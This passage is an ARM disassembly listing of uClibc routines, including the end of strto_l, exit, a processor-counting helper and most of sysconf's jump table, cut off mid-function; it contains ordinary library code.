   18ec0:	e59d3004 	ldr	r3, [sp, #4]
   18ec4:	e3570000 	cmp	r7, #0
   18ec8:	13a01102 	movne	r1, #-2147483648	; 0x80000000
   18ecc:	03e01102 	mvneq	r1, #-2147483648	; 0x80000000
   18ed0:	e3530000 	cmp	r3, #0
   18ed4:	115c0001 	cmpne	ip, r1
   18ed8:	9a000005 	bls	18ef4 <_stdlib_strto_l+0x1b0>
   18edc:	e59f3034 	ldr	r3, [pc, #52]	; 18f18 <_stdlib_strto_l+0x1d4>
   18ee0:	eb000662 	bl	1a870 <__aeabi_read_tp>
   18ee4:	e79f3003 	ldr	r3, [pc, r3]
   18ee8:	e3a02022 	mov	r2, #34	; 0x22
   18eec:	e7802003 	str	r2, [r0, r3]
   18ef0:	e1a0c001 	mov	ip, r1
   18ef4:	e3570000 	cmp	r7, #0
   18ef8:	126cc000 	rsbne	ip, ip, #0
   18efc:	e1a0000c 	mov	r0, ip
   18f00:	e28dd00c 	add	sp, sp, #12
   18f04:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   18f08:	e12fff1e 	bx	lr
   18f0c:	0000fc38 	.word	0x0000fc38
   18f10:	000001ec 	.word	0x000001ec
   18f14:	0000fb3c 	.word	0x0000fb3c
   18f18:	0000fb00 	.word	0x0000fb00

00018f1c <__GI_exit>:
   18f1c:	e59f509c 	ldr	r5, [pc, #156]	; 18fc0 <__GI_exit+0xa4>
   18f20:	e59f309c 	ldr	r3, [pc, #156]	; 18fc4 <__GI_exit+0xa8>
   18f24:	e08f5005 	add	r5, pc, r5
   18f28:	e7954003 	ldr	r4, [r5, r3]
   18f2c:	e59f3094 	ldr	r3, [pc, #148]	; 18fc8 <__GI_exit+0xac>
   18f30:	e24dd010 	sub	sp, sp, #16
   18f34:	e7951003 	ldr	r1, [r5, r3]
   18f38:	e1a02004 	mov	r2, r4
   18f3c:	e59f3088 	ldr	r3, [pc, #136]	; 18fcc <__GI_exit+0xb0>
   18f40:	e1a06000 	mov	r6, r0
   18f44:	e1a0000d 	mov	r0, sp
   18f48:	e795c003 	ldr	ip, [r5, r3]
   18f4c:	e1a0e00f 	mov	lr, pc
   18f50:	e12fff1c 	bx	ip
   18f54:	e59f3074 	ldr	r3, [pc, #116]	; 18fd0 <__GI_exit+0xb4>
   18f58:	e1a00004 	mov	r0, r4
   18f5c:	e795c003 	ldr	ip, [r5, r3]
   18f60:	e1a0e00f 	mov	lr, pc
   18f64:	e12fff1c 	bx	ip
   18f68:	e59f3064 	ldr	r3, [pc, #100]	; 18fd4 <__GI_exit+0xb8>
   18f6c:	e7952003 	ldr	r2, [r5, r3]
   18f70:	e1a03002 	mov	r3, r2
   18f74:	e3530000 	cmp	r3, #0
   18f78:	11a00006 	movne	r0, r6
   18f7c:	11a0e00f 	movne	lr, pc
   18f80:	112fff12 	bxne	r2
   18f84:	e59f304c 	ldr	r3, [pc, #76]	; 18fd8 <__GI_exit+0xbc>
   18f88:	e1a0000d 	mov	r0, sp
   18f8c:	e3a01001 	mov	r1, #1
   18f90:	e795c003 	ldr	ip, [r5, r3]
   18f94:	e1a0e00f 	mov	lr, pc
   18f98:	e12fff1c 	bx	ip
   18f9c:	eb000499 	bl	1a208 <__GI___uClibc_fini>
   18fa0:	e59f3034 	ldr	r3, [pc, #52]	; 18fdc <__GI_exit+0xc0>
   18fa4:	e0852003 	add	r2, r5, r3
   18fa8:	e1a03002 	mov	r3, r2
   18fac:	e3530000 	cmp	r3, #0
   18fb0:	11a0e00f 	movne	lr, pc
   18fb4:	112fff12 	bxne	r2
   18fb8:	e1a00006 	mov	r0, r6
   18fbc:	eb00063f 	bl	1a8c0 <__GI__exit>
   18fc0:	0000fa68 	.word	0x0000fa68
   18fc4:	0000008c 	.word	0x0000008c
   18fc8:	00000044 	.word	0x00000044
   18fcc:	00000070 	.word	0x00000070
   18fd0:	00000010 	.word	0x00000010
   18fd4:	00000458 	.word	0x00000458
   18fd8:	0000002c 	.word	0x0000002c
   18fdc:	ffff3190 	.word	0xffff3190

00018fe0 <nprocessors_onln>:
   18fe0:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   18fe4:	e59f411c 	ldr	r4, [pc, #284]	; 19108 <nprocessors_onln+0x128>
   18fe8:	e59f011c 	ldr	r0, [pc, #284]	; 1910c <nprocessors_onln+0x12c>
   18fec:	e08f4004 	add	r4, pc, r4
   18ff0:	e24dd00c 	sub	sp, sp, #12
   18ff4:	e0840000 	add	r0, r4, r0
   18ff8:	e3a05000 	mov	r5, #0
   18ffc:	e58d5004 	str	r5, [sp, #4]
   19000:	eb0008a9 	bl	1b2ac <__GI_config_open>
   19004:	e2506000 	subs	r6, r0, #0
   19008:	0a00001d 	beq	19084 <nprocessors_onln+0xa4>
   1900c:	e59f30fc 	ldr	r3, [pc, #252]	; 19110 <nprocessors_onln+0x130>
   19010:	e59fa0fc 	ldr	sl, [pc, #252]	; 19114 <nprocessors_onln+0x134>
   19014:	e0848003 	add	r8, r4, r3
   19018:	e28d7004 	add	r7, sp, #4
   1901c:	ea000010 	b	19064 <nprocessors_onln+0x84>
   19020:	e59d3004 	ldr	r3, [sp, #4]
   19024:	e5932000 	ldr	r2, [r3]
   19028:	e5d23000 	ldrb	r3, [r2]
   1902c:	e3530063 	cmp	r3, #99	; 0x63
   19030:	1a00000b 	bne	19064 <nprocessors_onln+0x84>
   19034:	e5d23001 	ldrb	r3, [r2, #1]
   19038:	e3530070 	cmp	r3, #112	; 0x70
   1903c:	1a000008 	bne	19064 <nprocessors_onln+0x84>
   19040:	e5d23002 	ldrb	r3, [r2, #2]
   19044:	e3530075 	cmp	r3, #117	; 0x75
   19048:	1a000005 	bne	19064 <nprocessors_onln+0x84>
   1904c:	e5d23003 	ldrb	r3, [r2, #3]
   19050:	e794200a 	ldr	r2, [r4, sl]
   19054:	e1a03083 	lsl	r3, r3, #1
   19058:	e19330b2 	ldrh	r3, [r3, r2]
   1905c:	e3130008 	tst	r3, #8
   19060:	12855001 	addne	r5, r5, #1
   19064:	e1a00006 	mov	r0, r6
   19068:	e1a01007 	mov	r1, r7
   1906c:	e59f20a4 	ldr	r2, [pc, #164]	; 19118 <nprocessors_onln+0x138>
   19070:	e1a03008 	mov	r3, r8
   19074:	eb0007b5 	bl	1af50 <__GI_config_read>
   19078:	e3500000 	cmp	r0, #0
   1907c:	1affffe7 	bne	19020 <nprocessors_onln+0x40>
   19080:	ea000018 	b	190e8 <nprocessors_onln+0x108>
   19084:	e59f0090 	ldr	r0, [pc, #144]	; 1911c <nprocessors_onln+0x13c>
   19088:	e0840000 	add	r0, r4, r0
   1908c:	eb000886 	bl	1b2ac <__GI_config_open>
   19090:	e2506000 	subs	r6, r0, #0
   19094:	01a05006 	moveq	r5, r6
   19098:	0a000012 	beq	190e8 <nprocessors_onln+0x108>
   1909c:	e59f307c 	ldr	r3, [pc, #124]	; 19120 <nprocessors_onln+0x140>
   190a0:	e0848003 	add	r8, r4, r3
   190a4:	e59f3078 	ldr	r3, [pc, #120]	; 19124 <nprocessors_onln+0x144>
   190a8:	e0847003 	add	r7, r4, r3
   190ac:	e28d4004 	add	r4, sp, #4
   190b0:	ea000004 	b	190c8 <nprocessors_onln+0xe8>
   190b4:	e59d3004 	ldr	r3, [sp, #4]
   190b8:	e5931000 	ldr	r1, [r3]
   190bc:	eb000ec3 	bl	1cbd0 <__GI_strcmp>
   190c0:	e3500000 	cmp	r0, #0
   190c4:	02855001 	addeq	r5, r5, #1
   190c8:	e1a01004 	mov	r1, r4
   190cc:	e59f2054 	ldr	r2, [pc, #84]	; 19128 <nprocessors_onln+0x148>
   190d0:	e1a03007 	mov	r3, r7
   190d4:	e1a00006 	mov	r0, r6
   190d8:	eb00079c 	bl	1af50 <__GI_config_read>
   190dc:	e3500000 	cmp	r0, #0
   190e0:	e1a00008 	mov	r0, r8
   190e4:	1afffff2 	bne	190b4 <nprocessors_onln+0xd4>
   190e8:	e1a00006 	mov	r0, r6
   190ec:	eb000861 	bl	1b278 <__GI_config_close>
   190f0:	e3550000 	cmp	r5, #0
   190f4:	11a00005 	movne	r0, r5
   190f8:	03a00001 	moveq	r0, #1
   190fc:	e28dd00c 	add	sp, sp, #12
   19100:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   19104:	e12fff1e 	bx	lr
   19108:	0000f9a0 	.word	0x0000f9a0
   1910c:	ffff7b28 	.word	0xffff7b28
   19110:	ffff6600 	.word	0xffff6600
   19114:	000001ec 	.word	0x000001ec
   19118:	00000102 	.word	0x00000102
   1911c:	ffff7b34 	.word	0xffff7b34
   19120:	ffff7b44 	.word	0xffff7b44
   19124:	ffff7b68 	.word	0xffff7b68
   19128:	00070202 	.word	0x00070202

0001912c <__GI_sysconf>:
   1912c:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   19130:	e59f45ec 	ldr	r4, [pc, #1516]	; 19724 <__GI_sysconf+0x5f8>
   19134:	e24dd014 	sub	sp, sp, #20
   19138:	e08f4004 	add	r4, pc, r4
   1913c:	e35000f0 	cmp	r0, #240	; 0xf0
   19140:	908ff100 	addls	pc, pc, r0, lsl #2
   19144:	ea0000f4 	b	1951c <__GI_sysconf+0x3f0>
   19148:	ea0000fa 	b	19538 <__GI_sysconf+0x40c>
   1914c:	ea0000f0 	b	19514 <__GI_sysconf+0x3e8>
   19150:	ea000103 	b	19564 <__GI_sysconf+0x438>
   19154:	ea000104 	b	1956c <__GI_sysconf+0x440>
   19158:	ea000105 	b	19574 <__GI_sysconf+0x448>
   1915c:	ea000155 	b	196b8 <__GI_sysconf+0x58c>
   19160:	ea000105 	b	1957c <__GI_sysconf+0x450>
   19164:	ea0000e8 	b	1950c <__GI_sysconf+0x3e0>
   19168:	ea0000e7 	b	1950c <__GI_sysconf+0x3e0>
   1916c:	ea0000e6 	b	1950c <__GI_sysconf+0x3e0>
   19170:	ea0000e5 	b	1950c <__GI_sysconf+0x3e0>
   19174:	ea0000e4 	b	1950c <__GI_sysconf+0x3e0>
   19178:	ea0000e3 	b	1950c <__GI_sysconf+0x3e0>
   1917c:	ea0000e2 	b	1950c <__GI_sysconf+0x3e0>
   19180:	ea0000e1 	b	1950c <__GI_sysconf+0x3e0>
   19184:	ea0000e0 	b	1950c <__GI_sysconf+0x3e0>
   19188:	ea0000df 	b	1950c <__GI_sysconf+0x3e0>
   1918c:	ea0000de 	b	1950c <__GI_sysconf+0x3e0>
   19190:	ea0000dd 	b	1950c <__GI_sysconf+0x3e0>
   19194:	ea0000dc 	b	1950c <__GI_sysconf+0x3e0>
   19198:	ea0000db 	b	1950c <__GI_sysconf+0x3e0>
   1919c:	ea0000da 	b	1950c <__GI_sysconf+0x3e0>
   191a0:	ea0000d9 	b	1950c <__GI_sysconf+0x3e0>
   191a4:	ea0000da 	b	19514 <__GI_sysconf+0x3e8>
   191a8:	ea0000d9 	b	19514 <__GI_sysconf+0x3e8>
   191ac:	ea000151 	b	196f8 <__GI_sysconf+0x5cc>
   191b0:	ea00014e 	b	196f0 <__GI_sysconf+0x5c4>
   191b4:	ea0000d6 	b	19514 <__GI_sysconf+0x3e8>
   191b8:	ea0000f3 	b	1958c <__GI_sysconf+0x460>
   191bc:	ea000141 	b	196c8 <__GI_sysconf+0x59c>
   191c0:	ea0000ef 	b	19584 <__GI_sysconf+0x458>
   191c4:	ea000143 	b	196d8 <__GI_sysconf+0x5ac>
   191c8:	ea0000d1 	b	19514 <__GI_sysconf+0x3e8>
   191cc:	ea000147 	b	196f0 <__GI_sysconf+0x5c4>
   191d0:	ea0000cf 	b	19514 <__GI_sysconf+0x3e8>
   191d4:	ea0000ce 	b	19514 <__GI_sysconf+0x3e8>
   191d8:	ea000148 	b	19700 <__GI_sysconf+0x5d4>
   191dc:	ea000149 	b	19708 <__GI_sysconf+0x5dc>
   191e0:	ea000146 	b	19700 <__GI_sysconf+0x5d4>
   191e4:	ea0000ea 	b	19594 <__GI_sysconf+0x468>
   191e8:	ea000134 	b	196c0 <__GI_sysconf+0x594>
   191ec:	ea0000c8 	b	19514 <__GI_sysconf+0x3e8>
   191f0:	ea000138 	b	196d8 <__GI_sysconf+0x5ac>
   191f4:	ea000143 	b	19708 <__GI_sysconf+0x5dc>
   191f8:	ea000144 	b	19710 <__GI_sysconf+0x5e4>
   191fc:	ea000141 	b	19708 <__GI_sysconf+0x5dc>
   19200:	ea000130 	b	196c8 <__GI_sysconf+0x59c>
   19204:	ea00012f 	b	196c8 <__GI_sysconf+0x59c>
   19208:	ea00012e 	b	196c8 <__GI_sysconf+0x59c>
   1920c:	ea0000c0 	b	19514 <__GI_sysconf+0x3e8>
   19210:	ea0000bf 	b	19514 <__GI_sysconf+0x3e8>
   19214:	ea00012b 	b	196c8 <__GI_sysconf+0x59c>
   19218:	ea0000bd 	b	19514 <__GI_sysconf+0x3e8>
   1921c:	ea0000bc 	b	19514 <__GI_sysconf+0x3e8>
   19220:	ea0000bb 	b	19514 <__GI_sysconf+0x3e8>
   19224:	ea0000ba 	b	19514 <__GI_sysconf+0x3e8>
   19228:	ea0000b9 	b	19514 <__GI_sysconf+0x3e8>
   1922c:	ea0000b8 	b	19514 <__GI_sysconf+0x3e8>
   19230:	ea0000b7 	b	19514 <__GI_sysconf+0x3e8>
   19234:	ea0000b6 	b	19514 <__GI_sysconf+0x3e8>
   19238:	ea00012a 	b	196e8 <__GI_sysconf+0x5bc>
   1923c:	ea0000b4 	b	19514 <__GI_sysconf+0x3e8>
   19240:	ea0000b3 	b	19514 <__GI_sysconf+0x3e8>
   19244:	ea0000b2 	b	19514 <__GI_sysconf+0x3e8>
   19248:	ea0000b1 	b	19514 <__GI_sysconf+0x3e8>
   1924c:	ea0000b0 	b	19514 <__GI_sysconf+0x3e8>
   19250:	ea0000af 	b	19514 <__GI_sysconf+0x3e8>
   19254:	ea0000ac 	b	1950c <__GI_sysconf+0x3e0>
   19258:	ea0000ab 	b	1950c <__GI_sysconf+0x3e0>
   1925c:	ea00011b 	b	196d0 <__GI_sysconf+0x5a4>
   19260:	ea00011a 	b	196d0 <__GI_sysconf+0x5a4>
   19264:	ea000119 	b	196d0 <__GI_sysconf+0x5a4>
   19268:	ea00011a 	b	196d8 <__GI_sysconf+0x5ac>
   1926c:	ea00011b 	b	196e0 <__GI_sysconf+0x5b4>
   19270:	ea00011c 	b	196e8 <__GI_sysconf+0x5bc>
   19274:	ea0000ca 	b	195a4 <__GI_sysconf+0x478>
   19278:	ea0000a5 	b	19514 <__GI_sysconf+0x3e8>
   1927c:	ea0000a2 	b	1950c <__GI_sysconf+0x3e0>
   19280:	ea0000a1 	b	1950c <__GI_sysconf+0x3e0>
   19284:	ea0000a0 	b	1950c <__GI_sysconf+0x3e0>
   19288:	ea00009f 	b	1950c <__GI_sysconf+0x3e0>
   1928c:	ea00009e 	b	1950c <__GI_sysconf+0x3e0>
   19290:	ea00009d 	b	1950c <__GI_sysconf+0x3e0>
   19294:	ea0000c4 	b	195ac <__GI_sysconf+0x480>
   19298:	ea0000e6 	b	19638 <__GI_sysconf+0x50c>
   1929c:	ea00009c 	b	19514 <__GI_sysconf+0x3e8>
   192a0:	ea00009b 	b	19514 <__GI_sysconf+0x3e8>
   192a4:	ea000111 	b	196f0 <__GI_sysconf+0x5c4>
   192a8:	ea0000e5 	b	19644 <__GI_sysconf+0x518>
   192ac:	ea0000e6 	b	1964c <__GI_sysconf+0x520>
   192b0:	ea00010a 	b	196e0 <__GI_sysconf+0x5b4>
   192b4:	ea000094 	b	1950c <__GI_sysconf+0x3e0>
   192b8:	ea000093 	b	1950c <__GI_sysconf+0x3e0>
   192bc:	ea000092 	b	1950c <__GI_sysconf+0x3e0>
   192c0:	ea000091 	b	1950c <__GI_sysconf+0x3e0>
   192c4:	ea0000b4 	b	1959c <__GI_sysconf+0x470>
   192c8:	ea000091 	b	19514 <__GI_sysconf+0x3e8>
   192cc:	ea000090 	b	19514 <__GI_sysconf+0x3e8>
   192d0:	ea00008d 	b	1950c <__GI_sysconf+0x3e0>
   192d4:	ea00008c 	b	1950c <__GI_sysconf+0x3e0>
   192d8:	ea00008b 	b	1950c <__GI_sysconf+0x3e0>
   192dc:	ea0000dc 	b	19654 <__GI_sysconf+0x528>
   192e0:	ea0000f6 	b	196c0 <__GI_sysconf+0x594>
   192e4:	ea0000dc 	b	1965c <__GI_sysconf+0x530>
   192e8:	ea000100 	b	196f0 <__GI_sysconf+0x5c4>
   192ec:	ea0000dc 	b	19664 <__GI_sysconf+0x538>
   192f0:	ea0000f8 	b	196d8 <__GI_sysconf+0x5ac>
   192f4:	ea0000f7 	b	196d8 <__GI_sysconf+0x5ac>
   192f8:	ea0000ee 	b	196b8 <__GI_sysconf+0x58c>
   192fc:	ea0000fd 	b	196f8 <__GI_sysconf+0x5cc>
   19300:	ea000102 	b	19710 <__GI_sysconf+0x5e4>
   19304:	ea0000d8 	b	1966c <__GI_sysconf+0x540>
   19308:	ea0000d9 	b	19674 <__GI_sysconf+0x548>
   1930c:	ea0000ff 	b	19710 <__GI_sysconf+0x5e4>
   19310:	ea0000d9 	b	1967c <__GI_sysconf+0x550>
   19314:	ea0000e9 	b	196c0 <__GI_sysconf+0x594>
   19318:	ea00007d 	b	19514 <__GI_sysconf+0x3e8>
   1931c:	ea00007c 	b	19514 <__GI_sysconf+0x3e8>
   19320:	ea0000d7 	b	19684 <__GI_sysconf+0x558>
   19324:	ea0000d8 	b	1968c <__GI_sysconf+0x560>
   19328:	ea0000f6 	b	19708 <__GI_sysconf+0x5dc>
   1932c:	ea0000ef 	b	196f0 <__GI_sysconf+0x5c4>
   19330:	ea0000ee 	b	196f0 <__GI_sysconf+0x5c4>
   19334:	ea0000ed 	b	196f0 <__GI_sysconf+0x5c4>
   19338:	ea0000ec 	b	196f0 <__GI_sysconf+0x5c4>
   1933c:	ea000072 	b	1950c <__GI_sysconf+0x3e0>
   19340:	ea000071 	b	1950c <__GI_sysconf+0x3e0>
   19344:	ea000072 	b	19514 <__GI_sysconf+0x3e8>
   19348:	ea000071 	b	19514 <__GI_sysconf+0x3e8>
   1934c:	ea00006e 	b	1950c <__GI_sysconf+0x3e0>
   19350:	ea00006d 	b	1950c <__GI_sysconf+0x3e0>
   19354:	ea00006c 	b	1950c <__GI_sysconf+0x3e0>
   19358:	ea00006f 	b	1951c <__GI_sysconf+0x3f0>
   1935c:	ea00006e 	b	1951c <__GI_sysconf+0x3f0>
   19360:	ea00006d 	b	1951c <__GI_sysconf+0x3f0>
   19364:	ea00006c 	b	1951c <__GI_sysconf+0x3f0>
   19368:	ea00006b 	b	1951c <__GI_sysconf+0x3f0>
   1936c:	ea00006a 	b	1951c <__GI_sysconf+0x3f0>
   19370:	ea000069 	b	1951c <__GI_sysconf+0x3f0>
   19374:	ea000066 	b	19514 <__GI_sysconf+0x3e8>
   19378:	ea000067 	b	1951c <__GI_sysconf+0x3f0>
   1937c:	ea000066 	b	1951c <__GI_sysconf+0x3f0>
   19380:	ea000065 	b	1951c <__GI_sysconf+0x3f0>
   19384:	ea000064 	b	1951c <__GI_sysconf+0x3f0>
   19388:	ea000063 	b	1951c <__GI_sysconf+0x3f0>
   1938c:	ea000062 	b	1951c <__GI_sysconf+0x3f0>
   19390:	ea000061 	b	1951c <__GI_sysconf+0x3f0>
   19394:	ea000060 	b	1951c <__GI_sysconf+0x3f0>
   19398:	ea00005f 	b	1951c <__GI_sysconf+0x3f0>
   1939c:	ea0000bc 	b	19694 <__GI_sysconf+0x568>
   193a0:	ea00005d 	b	1951c <__GI_sysconf+0x3f0>
   193a4:	ea00005c 	b	1951c <__GI_sysconf+0x3f0>
   193a8:	ea00005b 	b	1951c <__GI_sysconf+0x3f0>
   193ac:	ea00005a 	b	1951c <__GI_sysconf+0x3f0>
   193b0:	ea000059 	b	1951c <__GI_sysconf+0x3f0>
   193b4:	ea000058 	b	1951c <__GI_sysconf+0x3f0>
   193b8:	ea000057 	b	1951c <__GI_sysconf+0x3f0>
   193bc:	ea000056 	b	1951c <__GI_sysconf+0x3f0>
   193c0:	ea000055 	b	1951c <__GI_sysconf+0x3f0>
   193c4:	ea000054 	b	1951c <__GI_sysconf+0x3f0>
   193c8:	ea000053 	b	1951c <__GI_sysconf+0x3f0>
   193cc:	ea000052 	b	1951c <__GI_sysconf+0x3f0>
   193d0:	ea000051 	b	1951c <__GI_sysconf+0x3f0>
   193d4:	ea000050 	b	1951c <__GI_sysconf+0x3f0>
   193d8:	ea00004f 	b	1951c <__GI_sysconf+0x3f0>
   193dc:	ea00004e 	b	1951c <__GI_sysconf+0x3f0>
   193e0:	ea00004d 	b	1951c <__GI_sysconf+0x3f0>
   193e4:	ea00004c 	b	1951c <__GI_sysconf+0x3f0>
   193e8:	ea00004b 	b	1951c <__GI_sysconf+0x3f0>
   193ec:	ea00004a 	b	1951c <__GI_sysconf+0x3f0>
   193f0:	ea000049 	b	1951c <__GI_sysconf+0x3f0>
   193f4:	ea000048 	b	1951c <__GI_sysconf+0x3f0>
   193f8:	ea000047 	b	1951c <__GI_sysconf+0x3f0>
   193fc:	ea000046 	b	1951c <__GI_sysconf+0x3f0>
   19400:	ea000045 	b	1951c <__GI_sysconf+0x3f0>
   19404:	ea000044 	b	1951c <__GI_sysconf+0x3f0>
   19408:	ea000043 	b	1951c <__GI_sysconf+0x3f0>
   1940c:	ea000042 	b	1951c <__GI_sysconf+0x3f0>
   19410:	ea000041 	b	1951c <__GI_sysconf+0x3f0>
   19414:	ea000040 	b	1951c <__GI_sysconf+0x3f0>
   19418:	ea00003f 	b	1951c <__GI_sysconf+0x3f0>
   1941c:	ea00003e 	b	1951c <__GI_sysconf+0x3f0>
   19420:	ea00003d 	b	1951c <__GI_sysconf+0x3f0>
   19424:	ea00003c 	b	1951c <__GI_sysconf+0x3f0>
   19428:	ea00003b 	b	1951c <__GI_sysconf+0x3f0>
   1942c:	ea00003a 	b	1951c <__GI_sysconf+0x3f0>
   19430:	ea000039 	b	1951c <__GI_sysconf+0x3f0>
   19434:	ea000038 	b	1951c <__GI_sysconf+0x3f0>
   19438:	ea000037 	b	1951c <__GI_sysconf+0x3f0>
   1943c:	ea000036 	b	1951c <__GI_sysconf+0x3f0>
   19440:	ea000035 	b	1951c <__GI_sysconf+0x3f0>
   19444:	ea000034 	b	1951c <__GI_sysconf+0x3f0>
   19448:	ea000033 	b	1951c <__GI_sysconf+0x3f0>
   1944c:	ea000032 	b	1951c <__GI_sysconf+0x3f0>
   19450:	ea000031 	b	1951c <__GI_sysconf+0x3f0>
   19454:	ea000030 	b	1951c <__GI_sysconf+0x3f0>
   19458:	ea00002f 	b	1951c <__GI_sysconf+0x3f0>
   1945c:	ea00002e 	b	1951c <__GI_sysconf+0x3f0>
   19460:	ea00002d 	b	1951c <__GI_sysconf+0x3f0>
   19464:	ea00002c 	b	1951c <__GI_sysconf+0x3f0>
   19468:	ea00002b 	b	1951c <__GI_sysconf+0x3f0>
   1946c:	ea00002a 	b	1951c <__GI_sysconf+0x3f0>
   19470:	ea000029 	b	1951c <__GI_sysconf+0x3f0>
   19474:	ea000028 	b	1951c <__GI_sysconf+0x3f0>
   19478:	ea000027 	b	1951c <__GI_sysconf+0x3f0>
   1947c:	ea000026 	b	1951c <__GI_sysconf+0x3f0>
   19480:	ea000025 	b	1951c <__GI_sysconf+0x3f0>
   19484:	ea000024 	b	1951c <__GI_sysconf+0x3f0>
   19488:	ea000023 	b	1951c <__GI_sysconf+0x3f0>
   1948c:	ea000022 	b	1951c <__GI_sysconf+0x3f0>
   19490:	ea000021 	b	1951c <__GI_sysconf+0x3f0>
   19494:	ea000020 	b	1951c <__GI_sysconf+0x3f0>
   19498:	ea00001f 	b	1951c <__GI_sysconf+0x3f0>
   1949c:	ea00001e 	b	1951c <__GI_sysconf+0x3f0>
   194a0:	ea00001d 	b	1951c <__GI_sysconf+0x3f0>
   194a4:	ea00001c 	b	1951c <__GI_sysconf+0x3f0>
   194a8:	ea00001b 	b	1951c <__GI_sysconf+0x3f0>
   194ac:	ea00001a 	b	1951c <__GI_sysconf+0x3f0>
   194b0:	ea000019 	b	1951c <__GI_sysconf+0x3f0>
   194b4:	ea000018 	b	1951c <__GI_sysconf+0x3f0>
   194b8:	ea000017 	b	1951c <__GI_sysconf+0x3f0>
   194bc:	ea000016 	b	1951c <__GI_sysconf+0x3f0>
   194c0:	ea000015 	b	1951c <__GI_sysconf+0x3f0>
   194c4:	ea000014 	b	1951c <__GI_sysconf+0x3f0>
   194c8:	ea000013 	b	1951c <__GI_sysconf+0x3f0>
   194cc:	ea000012 	b	1951c <__GI_sysconf+0x3f0>
   194d0:	ea000011 	b	1951c <__GI_sysconf+0x3f0>
   194d4:	ea000010 	b	1951c <__GI_sysconf+0x3f0>
   194d8:	ea00000f 	b	1951c <__GI_sysconf+0x3f0>
   194dc:	ea00000e 	b	1951c <__GI_sysconf+0x3f0>
   194e0:	ea00000d 	b	1951c <__GI_sysconf+0x3f0>
   194e4:	ea00000c 	b	1951c <__GI_sysconf+0x3f0>
   194e8:	ea00000b 	b	1951c <__GI_sysconf+0x3f0>
   194ec:	ea00000a 	b	1951c <__GI_sysconf+0x3f0>
   194f0:	ea000009 	b	1951c <__GI_sysconf+0x3f0>
   194f4:	ea000008 	b	1951c <__GI_sysconf+0x3f0>
   194f8:	ea000007 	b	1951c <__GI_sysconf+0x3f0>
   194fc:	ea000002 	b	1950c <__GI_sysconf+0x3e0>
   19500:	ea000001 	b	1950c <__GI_sysconf+0x3e0>
   19504:	ea000002 	b	19514 <__GI_sysconf+0x3e8>
   19508:	ea000001 	b	19514 <__GI_sysconf+0x3e8>
   1950c:	e3a01001 	mov	r1, #1
   19510:	ea00007f 	b	19714 <__GI_sysconf+0x5e8>
   19514:	e3e01000 	mvn	r1, #0
   19518:	ea00007d 	b	19714 <__GI_sysconf+0x5e8>
   1951c:	e59f2204 	ldr	r2, [pc, #516]	; 19728 <__GI_sysconf+0x5fc>
   19520:	eb0004d2 	bl	1a870 <__aeabi_read_tp>
   19524:	e79f2002 	ldr	r2, [pc, r2]
   19528:	e3a03016 	mov	r3, #22
   1952c:	e3e01000 	mvn	r1, #0
   19530:	e7803002 	str	r3, [r0, r2]
   19534:	ea000076 	b	19714 <__GI_sysconf+0x5e8>
   19538:	e3a00003 	mov	r0, #3
   1953c:	e28d1008 	add	r1, sp, #8
   19540:	eb00055d 	bl	1aabc <__GI_getrlimit>
   19544:	e3500000 	cmp	r0, #0
   19548:	1a000003 	bne	1955c <__GI_sysconf+0x430>
   1954c:	e59d0008 	ldr	r0, [sp, #8]
   19550:	e3500702 	cmp	r0, #524288	; 0x80000
   19554:	21a01120 	lsrcs	r1, r0, #2
   19558:	2a00006d 	bcs	19714 <__GI_sysconf+0x5e8>
   1955c:	e3a01802 	mov	r1, #131072	; 0x20000
   19560:	ea00006b 	b	19714 <__GI_sysconf+0x5e8>
   19564:	e3a01064 	mov	r1, #100	; 0x64
   19568:	ea000069 	b	19714 <__GI_sysconf+0x5e8>
   1956c:	e3a01801 	mov	r1, #65536	; 0x10000
   19570:	ea000067 	b	19714 <__GI_sysconf+0x5e8>
   19574:	eb00052c 	bl	1aa2c <__GI_getdtablesize>
   19578:	ea00002f 	b	1963c <__GI_sysconf+0x510>
   1957c:	e3a01006 	mov	r1, #6
   19580:	ea000063 	b	19714 <__GI_sysconf+0x5e8>
   19584:	eb000542 	bl	1aa94 <__GI_getpagesize>
   19588:	ea00002b 	b	1963c <__GI_sysconf+0x510>
   1958c:	e3a01902 	mov	r1, #32768	; 0x8000
   19590:	ea00005f 	b	19714 <__GI_sysconf+0x5e8>
   19594:	e3a01ffa 	mov	r1, #1000	; 0x3e8
   19598:	ea00005d 	b	19714 <__GI_sysconf+0x5e8>
   1959c:	e59f1188 	ldr	r1, [pc, #392]	; 1972c <__GI_sysconf+0x600>
   195a0:	ea00005b 	b	19714 <__GI_sysconf+0x5e8>
   195a4:	e3a01901 	mov	r1, #16384	; 0x4000
   195a8:	ea000059 	b	19714 <__GI_sysconf+0x5e8>
   195ac:	e59f017c 	ldr	r0, [pc, #380]	; 19730 <__GI_sysconf+0x604>
   195b0:	e0840000 	add	r0, r4, r0
   195b4:	ebfff410 	bl	165fc <__GI_opendir>
   195b8:	e2505000 	subs	r5, r0, #0
   195bc:	0a000017 	beq	19620 <__GI_sysconf+0x4f4>
   195c0:	e59fa16c 	ldr	sl, [pc, #364]	; 19734 <__GI_sysconf+0x608>
   195c4:	e59f816c 	ldr	r8, [pc, #364]	; 19738 <__GI_sysconf+0x60c>
   195c8:	e59f616c 	ldr	r6, [pc, #364]	; 1973c <__GI_sysconf+0x610>
   195cc:	e3a07000 	mov	r7, #0
   195d0:	ea00000b 	b	19604 <__GI_sysconf+0x4d8>
   195d4:	e1d031b2 	ldrh	r3, [r0, #18]
   195d8:	e153000a 	cmp	r3, sl
   195dc:	1a000008 	bne	19604 <__GI_sysconf+0x4d8>
   195e0:	e1d031b4 	ldrh	r3, [r0, #20]
   195e4:	e1530008 	cmp	r3, r8
   195e8:	1a000005 	bne	19604 <__GI_sysconf+0x4d8>
   195ec:	e5d03016 	ldrb	r3, [r0, #22]
   195f0:	e7942006 	ldr	r2, [r4, r6]
   195f4:	e1a03083 	lsl	r3, r3, #1
   195f8:	e19330b2 	ldrh	r3, [r3, r2]
   195fc:	e3130008 	tst	r3, #8
   19600:	12877001 	addne	r7, r7, #1
   19604:	e1a00005 	mov	r0, r5
   19608:	eb000615 	bl	1ae64 <__GI_readdir64>
   1960c:	e3500000 	cmp	r0, #0
   19610:	1affffef 	bne	195d4 <__GI_sysconf+0x4a8>
   19614:	e1a00005 	mov	r0, r5
